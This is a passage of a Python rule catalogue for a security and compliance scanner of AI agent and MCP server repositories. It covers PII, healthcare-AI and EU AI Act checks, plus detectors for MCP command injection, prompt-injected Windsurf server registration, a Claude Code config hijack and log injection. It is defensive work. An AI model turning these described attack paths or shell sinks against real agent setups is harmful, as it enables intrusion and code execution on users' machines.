    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Remove the phone number. Never log raw phone numbers — hash them.",
    sarif_name="IndiaPhoneInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads a `+91` mobile number whose ten digits follow the country code without "
        "a break (`+91 9876543210`). The same number grouped in fives, `+91 98765 "
        "43210`, is not reported."
    ),
)

_r(
    "AAK-INDIA-PII-006",
    "Indian vehicle registration in source / config",
    "An Indian state-issued vehicle registration (e.g. 'MH 12 AB 1234') "
    "was detected. Vehicle registrations are PII in combination with "
    "driver records.",
    Severity.LOW,
    Category.SECRET_EXPOSURE,
    "Remove the registration from source. If dealing with vehicle data, "
    "anonymize before checking in.",
    sarif_name="IndiaVehicleInCode",
    owasp_mcp_references=["MCP10:2025"],
    limitations=(
        "Reads a registration only when it starts with one of 37 state and territory "
        "codes (`MH`, `DL`, `KA`, `TS` and so on). A code that is not on the list is "
        "not reported, and the list has no `TG`, the code Telangana has issued since "
        "2024 in place of `TS`."
    ),
)


# ---------------------------------------------------------------------------
# Healthcare-AI regulation triggers (AAK-HEALTHCARE-AI-001..005)
#
# References:
#   - Tennessee SB 1580 (signed 2026-04-01, effective 2026-07-01):
#     https://www.troutmanprivacy.com/2026/04/tennessee-enacts-health-care-ai-bill-with-private-right-of-action/
#   - Kansas / Washington / Utah prior-auth physician-review mandates.
#   - Georgia / Iowa AI-only insurance coverage decision restrictions.
#   - Only AAK-HEALTHCARE-AI-001 carries an OWASP reference: ASI09
#     (Human-Agent Trust Exploitation), for an AI presented as a licensed
#     professional. The others are statutory duties no OWASP entry names.
# ---------------------------------------------------------------------------

_r(
    "AAK-HEALTHCARE-AI-001",
    "AI described as a mental-health professional (Tennessee SB 1580)",
    "A tool description, SKILL.md body, agent card, or system prompt "
    "represents the AI as a therapist / counselor / psychologist / "
    "'qualified mental health professional'. Tennessee SB 1580 (signed "
    "2026-04-01) makes this unlawful and enforceable via the TN Consumer "
    "Protection Act, with a **private right of action** and $5,000 "
    "civil penalty per violation.",
    Severity.CRITICAL,
    Category.LEGAL_COMPLIANCE,
    "Rewrite the description. The AI can support mental-wellness use "
    "cases but cannot claim or imply it is (or replaces) a licensed "
    "mental-health professional. Add an explicit 'not a substitute for "
    "licensed care' disclaimer.",
    sarif_name="HealthcareAiMentalHealthClaim",
    owasp_agentic_references=["ASI09"],
    limitations=(
        "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches a short "
        "phrase list: `I am a/your therapist`, `act as a/your counselor`, `provide "
        "therapy`, `deliver psychotherapy`, `replace your therapist` and `licensed "
        "mental health professional`. The contraction `I'm your therapist`, `acting "
        "as your counselor` and the third-person `provides licensed therapy` or "
        "`delivers psychotherapy` are not matched, and neither is a persona written "
        "in a `.py` file."
    ),
)

_r(
    "AAK-HEALTHCARE-AI-002",
    "AI makes prior-authorization / medical-necessity decisions alone",
    "Code or prompt describes an AI system making prior-authorization "
    "or medical-necessity decisions without licensed-physician review. "
    "Kansas, Washington, and Utah 2026 laws require a clinician in the "
    "loop for these decisions.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Route every prior-auth / medical-necessity output through a "
    "licensed-physician review step; expose that review in the audit log.",
    sarif_name="HealthcareAiPriorAuthSolo",
    limitations=(
        "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches an "
        "adverb or a `no human` phrase, a verb in its base form and a decision "
        "object, as in `automatically approve prior authorization`. The same "
        "decision in the third person or another form (`automatically approves "
        "prior authorization requests`, `auto-denies medical necessity appeals`, "
        "`with no physician review`) is not matched, and neither is a rule written "
        "in a `.py` file."
    ),
)

_r(
    "AAK-HEALTHCARE-AI-003",
    "AI-only insurance coverage decision",
    "Code / prompt describes an AI system approving or denying insurance "
    "coverage without a human in the loop. Georgia and Iowa 2026 laws "
    "restrict AI-only coverage / benefit determinations.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Require human sign-off on coverage decisions; disclose AI "
    "involvement to the consumer.",
    sarif_name="HealthcareAiInsuranceSolo",
    limitations=(
        "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches `AI`, "
        "`algorithm` or `model`, then `only`, `solely` or `alone`, a decision verb "
        "and a singular object, as in `AI solely determines coverage`. `AI solely "
        "denies claims` (a plural object), `AI-only coverage decisions` (a hyphen) "
        "and `the model alone decides whether a benefit applies` (a clause in "
        "between) are not matched."
    ),
)

_r(
    "AAK-HEALTHCARE-AI-004",
    "Healthcare context without explicit AI-disclosure to user",
    "Text mentions patient / clinical / mental-health / therapy / "
    "diagnosis but the tool never explicitly says the responder is an "
    "AI. Multiple 2026 state laws (TN, WA, UT) expect clear AI "
    "disclosure in clinical interactions.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a visible 'You are talking to an AI; this is not medical "
    "advice and is not a substitute for licensed care' disclosure.",
    sarif_name="HealthcareAiNoDisclosure",
    limitations=(
        "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files. Healthcare context "
        "is one of nine whole words (`patient`, `clinical`, `medical`, `mental "
        "health`, `therapy`, `diagnosis`, `symptom`, `treatment`, `medication`), so "
        "plurals do not count: a persona about `symptoms` and `medications` is "
        "skipped, as is one about a nurse, a prescription or a dosage."
    ),
)

_r(
    "AAK-HEALTHCARE-AI-005",
    "Crisis keywords handled without escalation path",
    "A healthcare AI surface mentions suicide / self-harm / crisis but "
    "never references 988 / 911 / 112 / 999 / a crisis line. Tennessee "
    "HB 1951 (2026) creates criminal liability for encouraging suicide; "
    "lacking an escalation path materially worsens the exposure.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Add explicit crisis-line escalation instructions in the prompt / "
    "system message; test for the most common suicide / self-harm "
    "phrases and escalate before generating any other reply.",
    sarif_name="HealthcareAiNoCrisisEscalation",
    limitations=(
        "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches "
        "`suicid*`, `self-harm`, `overdose`, `harm myself`, `kill yourself`, `end "
        "my life` and similar; `want to die`, `self-injury` and `hurting "
        "themselves` are not matched. The escalation check passes on any `988`, "
        "`911`, `crisis line`, `emergency services` or `call 112` anywhere in the "
        "file, an unrelated number such as `ORD-911` included."
    ),
)


# ---------------------------------------------------------------------------
# US state consumer privacy disclosure (AAK-STATE-PRIVACY-001..003)
#
# References:
#   - Alabama Personal Data Protection Act (HB 351), signed 2026,
#     effective 2027-05-01 — the 21st state comprehensive privacy law:
#     https://iapp.org/news/a/alabama-set-to-add-variation-to-us-state-privacy-patchwork
#   - IAPP US State Privacy Legislation Tracker (21 states as of Apr 2026).
#   - CWE-200, CWE-359. No OWASP MCP or Agentic entry names a privacy-notice
#     duty, so these rules carry no OWASP reference.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# EU AI Act (Regulation (EU) 2024/1689) Article 50 — transparency obligations
# for providers and deployers of certain AI systems. **In force since
# 2026-08-02**, unlike the Article 15 high-risk duties this repository already
# maps, which the AI Omnibus deferred to 2027-12-02 (Annex III) and 2028-08-02
# (Annex I). Paragraph numbers read from the consolidated article on 2026-09-12:
# https://artificialintelligenceact.eu/article/50/
#
# Evidence toward a duty, never a determination that the duty applies. Whether a
# system is "intended to interact directly with natural persons", whether the
# fact is "obvious from context to a reasonably informed person", and whether an
# exemption is engaged are facts about a deployed product, not about a
# repository. 50(3) — emotion recognition and biometric categorisation — has no
# rule on purpose: there is no honest static signal for it, and guessing would
# accuse a project under a duty it may not hold.
# ---------------------------------------------------------------------------

_r(
    "AAK-AIACT50-001",
    "Conversational agent surface with no AI-disclosure to the user",
    "A persona, system prompt, chatbot or agent-card surface that converses "
    "with a person carries no string telling that person they are interacting "
    "with an AI system. Article 50(1) of the EU AI Act, in force since "
    "2026-08-02, requires a provider to design such a system so the natural "
    "persons concerned are informed, and 50(5) requires that clearly and "
    "distinguishably at the latest at the first interaction. The paragraph "
    "exempts cases obvious to a reasonably informed person, which is a fact "
    "about the deployed product; this is evidence toward the duty, not a "
    "determination that it applies or was breached.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "State in the agent's own surface that the user is talking to an AI, in a "
    "form that reaches them at first interaction rather than in a policy page "
    "they never open (Art. 50(5)). `AAK-HEALTHCARE-AI-004` is the same duty "
    "scoped to clinical contexts, where several US state laws expect it too.",
    sarif_name="EuAiActArt50NoInteractionDisclosure",
    limitations=(
        "Reads one file at a time. A disclosure rendered by the host "
        "application, or injected by a framework outside this repository, is "
        "not visible here. Art. 50(1)'s 'obvious from context' exemption cannot "
        "be evaluated statically at all."
    ),
)


_r(
    "AAK-AIACT50-002",
    "Synthetic media generation with no machine-readable provenance marking",
    "A declared capability to generate synthetic audio, image, video or text "
    "with no machine-readable marking of the output as artificially generated. "
    "Article 50(2) of the EU AI Act, in force since 2026-08-02, requires "
    "providers to mark such outputs in a machine-readable format, detectable as "
    "artificially generated or manipulated, and to do so effectively and "
    "interoperably so far as technically feasible. Assistive editing that does "
    "not substantially alter the input data is exempt. Evidence toward the "
    "duty, not a determination that it applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Attach C2PA Content Credentials to generated media, or an equivalent "
    "durable provenance signal such as SynthID for the modality you emit. "
    "Art. 50(2) asks for machine-readable and interoperable, so a visible "
    "caption alone does not answer it, and neither does a marking stripped by "
    "the first re-encode in your own pipeline.",
    sarif_name="EuAiActArt50NoSyntheticMarking",
    limitations=(
        "Detects the absence of a provenance marker in the same file that "
        "declares the generation capability. Marking applied by a downstream "
        "service, or by the model provider before the bytes reach this code, is "
        "not seen."
    ),
)


_r(
    "AAK-AIACT50-003",
    "Deep-fake or public-interest text generation with no artificiality disclosure",
    "A declared capability to produce deep-fake image, audio or video content, "
    "or to publish text intended to inform the public on matters of public "
    "interest, with no disclosure that the content is artificially generated or "
    "manipulated. Article 50(4) of the EU AI Act, in force since 2026-08-02, "
    "places this on the deployer, and 50(5) requires the disclosure at the "
    "latest at the time of first exposure. The paragraph exempts artistic, "
    "creative, satirical and fictional work, and text that had human editorial "
    "review with someone holding editorial responsibility. Evidence toward the "
    "duty, not a determination that it applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Disclose that the content is artificially generated or manipulated, at "
    "first exposure and in the content's own presentation rather than in "
    "terms of service. Where the work is artistic or satirical, Art. 50(4) "
    "still expects the existence of generated content to be disclosed, in a way "
    "that does not hamper enjoyment of the work.",
    sarif_name="EuAiActArt50NoDeepfakeDisclosure",
    limitations=(
        "The 50(4) exemptions are assessed by the words a project uses about "
        "itself: a file describing satire, fiction or human editorial review is "
        "skipped entirely. That is deliberately generous, because the failure "
        "mode of the opposite bias is accusing a newsroom of an offence."
    ),
)


# ---------------------------------------------------------------------------
# Colorado SB 26-189 (2026), C.R.S. 6-1-1702 "Developer responsibilities -
# documentation". Signed 2026-05-14; SECTION 5 of the act takes it effect
# 2027-01-01 and applies it to consequential decisions made on or after that
# date. Section numbers read from the signed act on 2026-09-12:
# https://leg.colorado.gov/bill_files/116489/download
#
# These rules produce EVIDENCE toward the documentation duty. None of them
# determines that the duty applies -- that turns on whether the operator does
# business in Colorado and whether the technology materially influences a
# consequential decision, neither of which a static scan establishes. Each rule
# fires only where the project's own declarations name both an inference and a
# 6-1-1701(6) covered domain, which is the shape of the statute's own scope test
# in 6-1-1702(3) and (5).
# ---------------------------------------------------------------------------

_r(
    "AAK-ADMT-001",
    "No developer documentation for a declared covered-domain decision surface",
    "The project declares a tool, MCP server or docstring that both performs an "
    "inference and names a Colorado SB 26-189 covered domain (education, "
    "employment, residential real estate, financial or lending services, "
    "insurance, health care, or essential government services and public "
    "benefits), and the repository carries no developer documentation at all: no "
    "model card, no system card, and no page naming intended uses. Where the "
    "technology is one C.R.S. 6-1-1702 covers, subsection (1) requires that "
    "documentation to be available to each deployer from 2027-01-01. This is "
    "evidence toward that duty, not a determination that the duty applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a model or system card naming the intended uses and known harmful or "
    "inappropriate uses (C.R.S. 6-1-1702(1)(a)), the categories of training data "
    "(1)(b), known limitations (1)(c), and instructions for appropriate use, "
    "monitoring and meaningful human review (1)(d). Retain it: 6-1-1702(4) "
    "requires records demonstrating compliance to be kept for not less than three "
    "years, including system version identifiers and changelogs.",
    sarif_name="AdmtNoDeveloperDocumentation",
    limitations=(
        "A covered-domain decision is declared only by the name and docstring of a "
        "Python function whose decorator name contains the word `tool`, or by the "
        "names and descriptions in an MCP config. An HTTP route "
        "(`@app.post(\"/score\")`) or a TypeScript `server.tool(...)` that scores "
        "loan applicants declares nothing, and no ADMT rule reports for it."
    ),
)


_r(
    "AAK-ADMT-002",
    "Developer documentation does not name the categories of training data",
    "Developer documentation exists for a declared covered-domain decision "
    "surface but does not describe the categories of data, including personal "
    "data, used to train the system. C.R.S. 6-1-1702(1)(b) requires that "
    "description, to the extent known, where the technology is one the statute "
    "covers. Evidence toward the duty, not a determination that it applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a section describing the categories of training data, including any "
    "personal data, to the extent known. C.R.S. 6-1-1702(1)(b) asks for "
    "categories rather than the data itself, so this is compatible with the "
    "trade-secret protection subsection (1) preserves.",
    sarif_name="AdmtNoTrainingDataCategories",
    limitations=(
        "Passes as soon as the documentation contains `training data`, `training "
        "set`, `training corpus`, `data used to train`, `categories of data` or "
        "`trained on`, and does not check that any category of data is named: "
        "`Training data: not disclosed` satisfies it."
    ),
)


_r(
    "AAK-ADMT-003",
    "Developer documentation names no known limitations",
    "Developer documentation exists for a declared covered-domain decision "
    "surface but names no known limitations. C.R.S. 6-1-1702(1)(c) requires "
    "known limitations including known risks and the circumstances in which the "
    "covered technology should not be used. Evidence toward the duty, not a "
    "determination that it applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a known-limitations section covering the risks and, specifically, the "
    "circumstances in which the system should not be used. C.R.S. 6-1-1702(1)(c) "
    "names the non-use circumstances explicitly, so a list of accuracy caveats "
    "alone does not answer it.",
    sarif_name="AdmtNoKnownLimitations",
    limitations=(
        "Passes as soon as the documentation contains `limitation`, `limitations`, "
        "`known risk`, `should not be used`, `out-of-scope` or `failure mode`, "
        "wherever it occurs: a license footer ending `permissions and limitations "
        "under the License` satisfies it."
    ),
)


_r(
    "AAK-ADMT-004",
    "Developer documentation gives no human-review instruction",
    "Developer documentation exists for a declared covered-domain decision "
    "surface but gives no instruction for human review of the system's output. "
    "C.R.S. 6-1-1702(1)(d) requires instructions for the deployer's appropriate "
    "use, monitoring, and meaningful human review, where applicable, and is more "
    "specific here than in the other documentation paragraphs. Evidence toward "
    "the duty, not a determination that it applies.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Document how a deployer is expected to monitor the system and what "
    "meaningful human review of its output looks like: who reviews, at what "
    "point in the decision, and with what authority to override. C.R.S. "
    "6-1-1702(1)(d). Note that 6-1-1705 gives the consumer a separate right to "
    "human review, which the deployer cannot exercise without this instruction.",
    sarif_name="AdmtNoHumanReviewInstruction",
    limitations=(
        "Passes on `human review`, `human-in-the-loop`, `human oversight`, `manual "
        "review` or `reviewed by a human` anywhere in the documentation, including "
        "in a sentence that denies it: `No human review is performed` satisfies it."
    ),
)


_r(
    "AAK-STATE-PRIVACY-001",
    "Privacy doc missing 'do-not-sell' / opt-out-of-sale language",
    "A privacy policy / notice lacks the CCPA-lineage opt-out-of-sale "
    "language that Alabama DPPA, CCPA, CPRA, VCDPA, and the other 21 "
    "state comprehensive privacy laws converge on.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a 'Do Not Sell / Share My Personal Information' section and a "
    "usable opt-out mechanism.",
    sarif_name="StatePrivacyNoOptOut",
    limitations=(
        "Reads `.md`, `.html` and `.txt` files whose own name contains `privacy`, "
        "`policy`, `terms`, `tos` or `legal`, and only when the text uses a phrase "
        "such as `privacy policy`, `data collection` or `personal data`. A policy "
        "named `how-we-use-data.md` or `privacy.rst`, or one that says only "
        "`Privacy` and `your email address`, is skipped. The opt-out test is the "
        "phrase `right to opt out`, which an opt-out of marketing email satisfies."
    ),
)

_r(
    "AAK-STATE-PRIVACY-002",
    "Privacy doc missing access / deletion / portability rights",
    "A privacy policy does not describe the consumer's access, "
    "deletion, or portability rights — mandatory across every state "
    "comprehensive privacy law passed 2018-2026.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Describe DSAR submission, 45-day cure window where applicable, and "
    "the portability format.",
    sarif_name="StatePrivacyNoConsumerRights",
    limitations=(
        "Reads the same files as AAK-STATE-PRIVACY-001. Passes on `right to "
        "access`, `right to know`, `request your data`, `data subject request` or "
        "`DSAR` anywhere in a qualifying file, whatever it says about them: `the "
        "right to access the Service` in terms of service, or `we do not accept any "
        "data subject request`, satisfies it."
    ),
)

_r(
    "AAK-STATE-PRIVACY-003",
    "Privacy doc missing data-controller contact",
    "A privacy policy does not expose a data-controller contact (DPO "
    "email / privacy@ / mailing address). Required by most state laws "
    "and a prerequisite for any DSAR.",
    Severity.LOW,
    Category.LEGAL_COMPLIANCE,
    "Add a privacy@ inbox and a postal mailing address for DSARs.",
    sarif_name="StatePrivacyNoContact",
    limitations=(
        "Reads the same files as AAK-STATE-PRIVACY-001. Passes on `data protection "
        "officer`, `privacy officer`, `dpo@` or `privacy@` anywhere in a qualifying "
        "file, including a sentence that says there is none (`We have no data "
        "protection officer`); nothing checks that an address or a postal contact "
        "follows."
    ),
)


# ---------------------------------------------------------------------------
# AAK-EU-AI-ACT-ART15-LOCALE-001 — EU AI Act Article 15 multilingual-eval
# coverage evidence (advisory, drives the eu-ai-act report subsection).
#
# Article 15 of Regulation (EU) 2024/1689 requires high-risk AI systems to
# achieve an "appropriate level of accuracy, robustness and cybersecurity
# throughout their lifecycle" — robustness explicitly covering "errors,
# faults or inconsistencies that may occur within the system or the
# environment in which the system operates". Under the AI Omnibus Regulation
# (OJ L_202601744) the Article-15 obligations are binding for Annex III
# high-risk use cases on 2027-12-02 and for Annex I product-embedded high-risk
# systems on 2028-08-02.
#
# Cross-lingual robustness is a documented blind spot in current safety
# stacks: Ford et al. 2026 (arXiv:2605.23157) "Same Model, Different
# Weakness" — 363-prompt red-team across 4 frontier MLLMs in US English
# and Mexican Spanish — find that "treating language and modality as
# independent dimensions in safety frameworks misses critical
# vulnerabilities in globally deployed systems", with safety rankings
# inverting between languages.
#
# This rule is advisory-only (INFO severity) and intentionally carries no
# ASI tag — it surfaces through the dedicated Article-15 evidence
# subsection in `compliance.py` rather than through the
# OWASP-Agentic-driven PASS/FAIL summary, so a single locale-coverage gap
# does not flip an entire control to FAIL. The auditor reading the
# compliance report sees the evidence; the security-score path is
# unaffected.
# ---------------------------------------------------------------------------

_r(
    "AAK-EU-AI-ACT-ART15-LOCALE-001",
    "Multilingual user-facing agent lacks per-locale eval coverage",
    "An agent config declares two or more locales (or `multilingual: true`) "
    "for a user-facing surface, but the repository's eval / test fixtures "
    "reference only a single language. Cross-lingual robustness is a "
    "required-evidence axis under EU AI Act Article 15 (binding for "
    "Annex III high-risk use cases on 2027-12-02 and for Annex I "
    "product-embedded high-risk systems on 2028-08-02), and Ford et al. 2026 "
    "(arXiv:2605.23157) document that single-language safety eval misses "
    "language-specific jailbreak / refusal-regression vectors that scale "
    "non-uniformly across languages.",
    Severity.INFO,
    Category.LEGAL_COMPLIANCE,
    "Add per-locale eval fixtures matching the declared locale set (one "
    "scenario file per language, or a parametrized eval matrix), or "
    "narrow the agent config's declared locales to the set you can "
    "evidence. The EU AI Act Article 15 evidence pack must show "
    "robustness testing across each user-facing language.",
    sarif_name="EuAiActArt15LocaleCoverage",
    limitations=(
        "Counts a locale as evaluated when its code appears in the path of any file "
        "under a directory named `evals`, `fixtures`, `scenarios`, `i18n`, "
        "`locales`, `benchmarks` and the like, whatever the file holds, so "
        "`locales/fr.json`, a file of UI strings, counts as an eval for French. It "
        "recognises 30 two-letter language codes (`ta` and `te` are not among them) "
        "and finds agent configs by file name (`agent.yaml`, `crew.yaml`, "
        "`manifest.yaml` and a few more; `config.yaml` is not read). `multilingual: "
        "true` with no named locales is not read."
    ),
)


# ---------------------------------------------------------------------------
# Ox MCP STDIO architectural supply-chain class (AAK-STDIO-001)
#
# April 16 2026 Ox Security disclosure chained 10 CVEs across 200K+
# exposed servers to one shape: user-controllable command parameters
# reaching subprocess/exec/shell on the STDIO server side.
#
# References:
#   - Ox disclosure: https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
#   - CVE-2026-30615 (Windsurf, CVSS 8.0): https://nvd.nist.gov/vuln/detail/CVE-2026-30615
#   - Family: CVE-2025-65720 (GPT Researcher), CVE-2026-30617 (Langchain-Chatchat),
#     CVE-2026-30618 (Fay), CVE-2026-30623 (LiteLLM), CVE-2026-30624 (Agent Zero),
#     CVE-2026-30625 (Upsonic), CVE-2026-33224 (Bisheng/Jaaz),
#     CVE-2026-26015 (DocsGPT).
#   - CWE-77 (Command Injection).
# ---------------------------------------------------------------------------

_r(
    "AAK-STDIO-001",
    "MCP STDIO command-injection (Ox architectural class)",
    "User-controllable input flows into a STDIO command executor in an "
    "MCP server implementation — the architectural shape Ox Security "
    "traced through CVE-2026-30615 (Windsurf RCE) and nine other CVEs "
    "across ~200,000 exposed servers. Matches subprocess / os.system / "
    "os.popen / os.exec / eval / exec where an arg references a taint "
    "source (request params, stdin, @tool parameter, json.loads(stdin)). "
    "TS/JS variant: child_process.spawn / execa with {shell:true} or a "
    "request-derived command string.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Never pass caller-controlled data into a shell. Use argv lists "
    "(subprocess.run([...]) without shell=True), allowlist the command "
    "set, and validate arguments against an explicit schema. For TS, "
    "pass argv as an array with shell:false and validate every element "
    "against a regex or allowlist.",
    sarif_name="McpStdioCommandInjection",
    cve_references=[
        "CVE-2026-30615",
        "CVE-2025-65720",
        "CVE-2026-30617",
        "CVE-2026-30618",
        "CVE-2026-30623",
        "CVE-2026-30624",
        "CVE-2026-30625",
        "CVE-2026-33224",
        "CVE-2026-26015",
    ],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-04"],
    incident_references=["OX-MCP-2026-04-15"],
    limitations=(
        "A Python value counts as caller input when it is named stdin, request, req, "
        "event, params, tool_input, input_data, args or payload, or is a parameter of "
        "a function whose decorator name ends in `tool` (`@mcp.tool`, `@mcp.tool()`, "
        "`@server.call_tool()`). The sinks are the `subprocess` run, call, Popen, "
        "check_call and check_output calls, `os.system`, `os.popen`, `os.execv`, "
        "`os.execvp`, `commands.getoutput`, `eval` and `exec`, also under an imported "
        "name (`import subprocess as sp`, `from subprocess import run`), and a call "
        "whose last name is run, call, Popen, check_call, check_output, system, popen, "
        "exec or eval on a receiver whose name says executor (shell, process, sandbox, "
        "terminal, command, runner and similar). So `asyncio.create_subprocess_shell` "
        "is not one, and neither is an executor behind a short name, such as Fabric's "
        "`c.run(cmd)`. In TypeScript a command counts "
        "as request-derived only when its text contains req, request, body, params, "
        "event, stdin or tool_input, so a destructured tool argument (`exec(`git log "
        "${branch}`)`) is not."
    ),
)

# ---------------------------------------------------------------------------
# Windsurf MCP auto-registration hardening (AAK-WINDSURF-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-WINDSURF-001",
    "Windsurf .windsurf/mcp.json auto-approves server registrations",
    "A `.windsurf/mcp.json` file declares auto_approve:true or "
    "auto_execute:true, or contains server `command:` entries with no "
    "SHA-256 pin. CVE-2026-30615 (Windsurf 1.9544.26, CVSS 8.0) shows "
    "attackers can inject malicious MCP registrations via HTML prompt "
    "injection when auto-approval is enabled.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Set auto_approve and auto_execute to false. Pin every server "
    "command to a SHA-256 digest. Upgrade Windsurf to a version with "
    "the registration confirmation flow enabled.",
    sarif_name="WindsurfAutoApprove",
    cve_references=["CVE-2026-30615"],
    owasp_mcp_references=["MCP04:2025", "MCP09:2025"],
    owasp_agentic_references=["ASI04", "ASI09"],
    adversa_references=["ADV-RCE-05"],
)

# ---------------------------------------------------------------------------
# Neo4j Cypher MCP read-only bypass (AAK-NEO4J-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-NEO4J-001",
    "mcp-neo4j-cypher < 0.6.0 APOC read-only bypass",
    "A dependency pin targets mcp-neo4j-cypher earlier than 0.6.0, or "
    "source code sets read_only=True while issuing CALL apoc.* / "
    "db.cypher.runWrite procedures. CVE-2026-35402 (CVSS 2.3 LOW, but "
    "integrity-critical) lets attackers bypass the read-only mode and "
    "execute arbitrary writes or SSRF.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade mcp-neo4j-cypher to 0.6.0 or later. In source code, stop "
    "relying on read_only=True as a security boundary when APOC "
    "procedures are in scope; deny-list apoc.* at the query layer.",
    sarif_name="Neo4jApocBypass",
    cve_references=["CVE-2026-35402"],
    owasp_mcp_references=["MCP02:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
    auto_fixable=True,
    limitations=(
        "The pin reads requirements.txt, requirements-dev.txt, "
        "requirements-prod.txt and dev-requirements.txt at the project root, on a "
        "line that starts with `mcp-neo4j-cypher` and a version below 0.6.0. A name "
        "with extras, an unpinned line, pyproject.toml, uv.lock, "
        "`requirements/base.txt` and a `uvx mcp-neo4j-cypher==0.5.0 --read-only` "
        "launcher in .mcp.json are not read. The source arm needs `read_only = "
        "True` and a `CALL apoc.` or `runWrite` reference in the same Python file, "
        "so a query kept in another module is not matched."
    ),
)

# ---------------------------------------------------------------------------
# Claude Code Windows ProgramData hijack (AAK-CLAUDE-WIN-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-CLAUDE-WIN-001",
    "Claude Code < 2.1.75 reads managed-settings.json from unsafe ProgramData path",
    "On Windows, Claude Code prior to 2.1.75 loads "
    "`%ProgramData%\\ClaudeCode\\managed-settings.json` without validating "
    "directory ownership or ACLs. A low-privileged user can plant a "
    "malicious config that executes on every launch. CVE-2026-35603 "
    "(CVSS 5.4 MEDIUM, CWE-426 Untrusted Search Path).",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Upgrade Claude Code to 2.1.75 or later. If the directory must "
    "exist for deployment, ship a sibling `setup.ps1` that runs "
    "`icacls` to restrict ACLs to TrustedInstaller + administrators "
    "before any Claude Code launch.",
    sarif_name="ClaudeCodeWindowsProgramData",
    cve_references=["CVE-2026-35603"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-PATH-01"],
    limitations=(
        "Needs a `managed-settings.json` whose own path contains `ProgramData`, so "
        "a file staged elsewhere and copied into `%ProgramData%\\ClaudeCode` by an "
        "installer is not seen. A sibling `setup.ps1` that mentions `icacls` clears "
        "the finding whatever the command grants, `icacls ... /grant "
        "Everyone:(OI)(CI)F` included."
    ),
)

# ---------------------------------------------------------------------------
# Log-injection in MCP tool handlers (AAK-LOGINJ-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-LOGINJ-001",
    "MCP tool logs caller-controlled input without CRLF/ANSI sanitization",
    "A `@tool`-decorated function parameter flows into logger.info / "
    "print / sys.stdout.write / console.log without stripping control "
    "characters (\\r, \\n, \\x1b) first. CVE-2026-6494 (AAP MCP, CVSS 5.3 "
    "MEDIUM, CWE-117) lets an attacker forge log entries and inject "
    "ANSI escape sequences to socially engineer an operator.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Strip \\r\\n\\x1b (or accept only printable ASCII) before "
    "logging anything derived from tool input. Prefer structured "
    "logging (JSON/logfmt) so log consumers aren't confused by forged "
    "lines.",
    sarif_name="McpLogInjection",
    cve_references=["CVE-2026-6494"],
    owasp_mcp_references=["MCP08:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-LOG-01"],
    limitations=(
        "Reads the arguments of calls spelled `logger.<level>`, `log.<level>`, "
        "`console.<level>` and `sys.stdout.write` in functions whose decorator name "
        "ends in `tool`. `logging.info(...)`, `self.logger.info(...)` and "
        "`print(...)` are not matched, and a `.replace(\"\\n\", ...)` or a `sanitize` "
        "call anywhere in the function clears it, whichever value that touches."
    ),
)

# ---------------------------------------------------------------------------
# MCP server-repo SECURITY.md requirement (AAK-SEC-MD-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-SEC-MD-001",
    "MCP server repo missing SECURITY.md or security_contact",
    "A repository whose name or pyproject keywords declare it as an "
    "MCP server ships without a top-level SECURITY.md AND without a "
    "`security_contact` entry in marketplace.json / pyproject.toml / "
    "package.json. Anthropic's April 2026 SECURITY.md guidance makes "
    "this the baseline expectation so researchers have a channel.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Add SECURITY.md at the repo root with a disclosure email and "
    "response SLA; OR add `security_contact` to the project manifest.",
    sarif_name="McpServerNoSecurityMd",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    limitations=(
        "Treats a repository as an MCP server only when `mcp` appears in the name "
        "or keywords of the root pyproject.toml, package.json or "
        ".claude-plugin/marketplace.json. A server named without it (an "
        "`acme-tools` package whose keyword is `model-context-protocol` and which "
        "depends on the SDK), one declared in Cargo.toml or go.mod, and a "
        "package.json in a sub-directory are not recognised."
    ),
)


# ---------------------------------------------------------------------------
# MCPwn — targeted detection for CVE-2026-33032 middleware-asymmetry class
#
# The generic AAK-MCP-011/012/020 rules fire on *single-route* auth
# absence. MCPwn (CVSS 9.8, KEV-listed 2026-04-13) is a different shape
# entirely: TWO routes share a handler, but only one is wrapped in
